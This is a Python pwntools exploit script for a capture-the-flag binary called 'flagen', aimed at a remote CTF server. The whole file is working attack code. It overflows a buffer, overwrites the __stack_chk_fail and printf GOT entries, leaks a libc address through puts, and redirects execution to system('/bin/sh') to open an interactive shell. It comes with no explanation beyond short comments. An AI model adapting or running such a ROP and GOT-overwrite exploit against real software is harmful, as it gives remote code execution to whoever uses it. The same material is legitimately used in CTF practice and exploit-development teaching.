from pwn import *
context.log_level="debug"

r=remote("pwn.sixstars.team",23640)
#r=process("flagen_flagen.dms")

elf=ELF("flagen_flagen.dms")
libc=ELF("x32_libc-2.23.so")

#print r.pid
#pause()

ret=0x080484ae
pop1=0x080484c5
puts=elf.got['puts']
read=0x08048D83
bss=0x804b810

x=p32(ret)
x+=p32(0x8048536)
x+=p32(0x8048546)
x+=p32(0x8048556) # got[puts]+6
x+=p32(0x8048566)
x+=p32(0x8048576)
x+=p32(0x8048586)
x+=p32(0x8048596)
x+=p32(0x80485a6)
x+=p32(0x80485b6)

sh=x+'a'*(0xa1-len(x)) + 'h'*0x25 + p32(pop1) + p32(elf.got['__stack_chk_fail'])    # overflow __stack_chk_fail
sh+=p32(elf.plt['puts'])+p32(pop1)+p32(elf.got['puts'])                             # leak libc
sh+=p32(read)+p32(pop1)+p32(bss)                                                    # read /bin/sh to bss
sh+=p32(read)+p32(pop1)+p32(0x804b010)                                              # read system() to got['printf']
sh+=p32(elf.plt['printf'])+p32(0xdeadbeef)+p32(bss)                                 # call printf()
sh+='a'

r.recvuntil("choice: ")
r.sendline("1")
r.send(sh)

r.recvuntil("choice: ")
r.sendline("4")

libc.address=u32(r.recv(4))-libc.sym['puts']
print "libc.address : " + hex(libc.address)
r.recv()

r.sendline("/bin/sh\x00")
r.sendline(p32(libc.sym['system']))

r.interactive()
